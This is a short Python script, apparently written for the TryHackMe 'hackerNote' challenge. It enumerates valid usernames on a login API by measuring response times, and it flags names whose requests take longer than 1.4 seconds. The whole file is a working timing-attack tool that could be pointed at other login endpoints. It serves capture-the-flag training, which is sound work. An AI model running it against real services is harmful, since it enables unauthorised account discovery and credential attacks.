#!/usr/bin/env python3

# AJ2K
# A script to enumerate valid user accounts on the TryHackMe 'hackerNote' challenge

import requests, colorama, argparse
from colorama import Fore, Style, init, Back

parser = argparse.ArgumentParser(description='Args')
requiredNamed = parser.add_argument_group('Required Arguments')
requiredNamed.add_argument("-u", dest="URL",  help="protocol:host eg http(s)://x.x.x.x", required=True)
requiredNamed.add_argument("-w", dest="Wordlist", help="The list of usernames to try", required=True)
parser.add_argument("-p", dest="Proxy", help="protocol:host:port eg http://127.0.0.1:8080", required=False)
args = parser.parse_args()

try:
     url = args.URL
     if url.endswith('/'):
          url = url.rstrip('/')
     else:
          pass
     url = url + "/api/user/login"
     wordlist = args.Wordlist
     print(url)
except:
     error()

if args.Proxy is None:
     proxybool = False
else:
     proxiesarg = args.Proxy
     proxybool = True


headers = {
"Accept-Language": "en-US,en;q=0.5",
"Content-Type": "application/json",
"Origin": url
}


if (proxybool):
     proxy = {
     "http": proxiesarg,
     "https": proxiesarg
     }
else:
    pass

count = 1
fullLineCount = 0

with open(wordlist) as usernames:
     for line in usernames:
          fullLineCount += 1
     print("Total Requests: "+str(fullLineCount))
     print("Request Number \t\t    Payload")
     usernames.close()

with open(wordlist) as usernames:
     for line in usernames:
          data = '{"username":"'+line.strip()+'","password":"-"}'
          if proxybool:
               r = requests.post(url, proxies=proxy, headers=headers, data=data, verify=False)
          else:
               r = requests.post(url, headers=headers, data=data, verify=False)
          time = r.elapsed.total_seconds()
          if time > 1.4:
               print(Fore.GREEN + Style.BRIGHT + "", end=f"\r      {count}       {data} - VALID\n")
          else:
               print(Style.RESET_ALL + "", end=f"\r      {count}       {data}        ")
          count += 1
print(Style.RESET_ALL + "", end=f"\r")
